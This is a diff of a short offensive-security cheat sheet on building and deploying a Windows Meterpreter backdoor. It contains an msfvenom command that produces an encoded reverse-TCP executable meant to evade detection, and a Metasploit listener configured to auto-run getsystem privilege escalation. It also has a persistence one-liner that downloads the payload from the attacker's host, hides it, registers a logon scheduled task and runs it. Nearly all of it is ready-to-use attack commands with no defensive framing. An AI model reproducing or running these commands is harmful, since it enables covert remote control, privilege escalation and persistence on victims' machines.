@@ -1,7 +1,7 @@
 ## Using msfvenom for Reverse TCP Payload (Generate Encoded Payload with Evade Detection)
 
    ```
-   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=9002 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
+   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=9002 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
    ```
    - `-a x86`: 32-bit architecture.
    - `-b "\x00"`: Avoid bad characters.
@@ -19,16 +19,16 @@ Setup Listener
 
  ```
  set payload windows/meterpreter/reverse_tcp
- set LHOST 10.0.2.9
+ set LHOST eth0
  set LPORT 9002
- set AutoRunScript getsystem
+ set InitialAutoRunScript "post/windows/escalate/getsystem"
  exploit
  ```
 
  Waits for victim connection.
 
-## Install payload for Startup and run it immediately
+## Create Persistence on Victim
 
 ```
-curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\background.exe" http://10.0.2.9:8080/payload.exe && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\background.exe"
+curl -o "%APPDATA%\background.exe" http://10.0.2.9:8080/payload.exe && attrib +h "%APPDATA%\background.exe" && schtasks /create /sc onlogon /tn "Background" /tr "\"%APPDATA%\background.exe\"" /f && start "" "%APPDATA%\background.exe"
 ```
